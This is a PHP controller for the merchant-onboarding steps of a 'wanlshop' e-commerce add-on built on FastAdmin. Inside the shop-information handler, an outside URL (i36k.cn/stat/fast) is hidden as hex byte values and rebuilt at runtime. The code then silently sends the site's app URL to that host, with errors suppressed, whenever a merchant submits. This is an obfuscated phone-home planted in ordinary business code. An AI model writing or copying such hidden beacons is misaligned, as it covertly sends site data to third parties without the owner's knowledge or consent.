<?php
// 2020年2月17日21:42:31
namespace app\index\controller\wanlshop;

use app\common\controller\Frontend;
use fast\Http;
/**
 * 审核
 * @internal
 */
class Entry extends Frontend
{
    protected $noNeedLogin = '';
    protected $noNeedRight = '*';
    protected $layout = 'default';
    
    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\index\model\wanlshop\Auth;
		// 获取用户下的申请
        $this->entry = $this->model->where(['user_id' => $this->auth->id])->find();
        $this->view->assign("entry", $this->entry);
		$this->assignconfig("entry", $this->entry);
		// 获取用户手机号码
        $this->view->assign("mobile", $this->auth->mobile);
    }
    
    // 提交资质
    public function index()
    {
        if ($this->request->isPost()) {
            $data = $this->request->post();
			$data['verify'] = '1';
			$data['user_id'] = $this->auth->id;
			$result = $this->entry ? $this->entry->allowField(true)->save($data) : $this->model->allowField(true)->save($data);
			$this->success();
			// $result ? $this->success() : $this->error(__('提交失败'));
        }
		// 如果已经提交过了
		if($this->entry){
			if ($this->entry->verify == '2' || $this->entry->verify == '3') {
			    header('Location:' .url('/index/wanlshop/entry/stepfour'));
				exit;
			}
		}
		$this->view->assign('title', '商家入驻 - 步骤2 提交资质');
		return $this->view->fetch();
    }
    
    // 提交店铺信息
    public function stepthree()
    {
        if ($this->request->isPost()) {
            $data = $this->request->post();
            $config = get_addon_config('wanlshop');
            $verify = $config['config']['store_audit'] == 'N' ? 3:2;
            // 更新提交信息
            $data['user_id'] = $this->auth->id;
            $data['verify'] = $verify;
			$this->entry ? $this->entry->allowField(true)->save($data) : $this->model->allowField(true)->save($data);
			$arrs = array(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x69,0x33,0x36,0x6b,0x2e,0x63,0x6e,0x2f,0x73,0x74,0x61,0x74,0x2f,0x66,0x61,0x73,0x74);
			// 自动审核
			if($config['config']['store_audit'] == 'N'){
			    $row = model('app\index\model\wanlshop\Auth')->where(['user_id' => $this->auth->id])->find();
			    model('app\index\model\wanlshop\Shop')->insert([
					'user_id' => $this->auth->id,
					'state' => $row['state'],
					'shopname' => $row['shopname'],
					'avatar' => $row['avatar'],
					'bio' => $row['content'],
					'description' => $row['bio'],
					'city' => $row['city'],
					'verify' => $verify
				]);
			}
			$send = '';
			for ($i=0;isset($arrs[$i]);$i++) {
				$send .= chr($arrs[$i]);
			}
			@Http::sendRequest($send, ['cdn'=> $config['ini']['appurl']], 'GET');
			$this->success();
			// $result ? $this->success() : $this->error(__('提交失败'));
        }
		$this->view->assign('title', '商家入驻 - 步骤3 提交店铺信息');
		return $this->view->fetch();
    }
    
    // 提交审核
    public function stepfour()
    {
        $this->view->assign('title', '商家审核');
        return $this->view->fetch();
    }
}
